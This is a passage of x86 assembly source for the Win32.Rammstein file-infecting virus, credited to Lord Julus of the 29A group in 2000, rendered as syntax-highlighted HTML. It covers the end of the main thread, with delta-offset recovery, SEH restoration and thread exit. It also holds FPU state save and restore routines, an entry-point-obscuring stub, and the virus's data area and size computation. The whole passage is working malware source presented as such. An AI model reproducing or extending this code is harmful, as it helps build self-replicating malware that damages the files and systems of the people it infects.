       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;must restore the ESP</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">restore_main_seh</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;and restore the SEH</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;returning to the host...</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">restore_delta</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">restore_delta</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">restore_delta</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">just_kill_it</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_ExitThread</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;Exit the main thread</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Safe Copro. Thanx to Prizzy for pointing me that the copro cannot be shared</span><span class="sc0">
</span><span class="sc1">; in the same process and need to be saved to keep compatibility!</span><span class="sc0">

</span><span class="sc5">InitCopro</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">                                </span><span class="sc1">;create space for copro</span><span class="sc0">
       </span><span class="sc7">fwait</span><span class="sc0">                                       </span><span class="sc1">;data, wait for last to</span><span class="sc0">
       </span><span class="sc7">fnsave</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">                                </span><span class="sc1">;finish and save...</span><span class="sc0">
       </span><span class="sc7">finit</span><span class="sc0">                                       </span><span class="sc1">;initialize copro</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;and return</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">RestoreCopro</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fwait</span><span class="sc0">                                       </span><span class="sc1">;wait to finish</span><span class="sc0">
       </span><span class="sc7">frstor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">;restore copro data</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;now find out our return</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;address without altering</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;eax, kill the copro space</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">                                </span><span class="sc1">;on the stack. One Dword</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;remains on the stack</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">EPO_Routine</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">; Data area                                        ;</span><span class="sc0">
</span><span class="sc5">test_semaphore</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">W32FD</span><span class="sc0">          </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">           </span><span class="sc5">SYSTEMTIME</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">0</span><span class="sc4">&gt;</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc10">memory</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">free_routine</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">AVAILABLE</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">version</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">newsize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">newraw</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">situation</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DeltaRVA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">mainthreadid</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">headersum</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">checksumfile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">lowest_section_raw</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">apihookfinish</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">tempcounter</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">fileopen</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Semaphore</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Win32.Rammstein"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">saved_code</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">mmx</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">skipper</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_imports</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">totalsizes</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">smallest_dir_va</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">netapis</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ok</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">get_apis.inc</span><span class="sc0">                               </span><span class="sc1">;included files</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">rammdata.inc</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc5">virussize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">end</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">copyright</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Win32.Rammstein.'</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc4">/</span><span class="sc2">10000</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc4">/</span><span class="sc2">01000</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc4">/</span><span class="sc2">00100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc4">/</span><span class="sc2">00010</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc4">/</span><span class="sc2">00001</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' v4.0'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'(c) Lord Julus - 2000 / [29A]'</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">MainThread</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">end2</span><span class="sc4">:</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc5">debug_end</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Here is the end of the virus.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span></div></body>
</html>
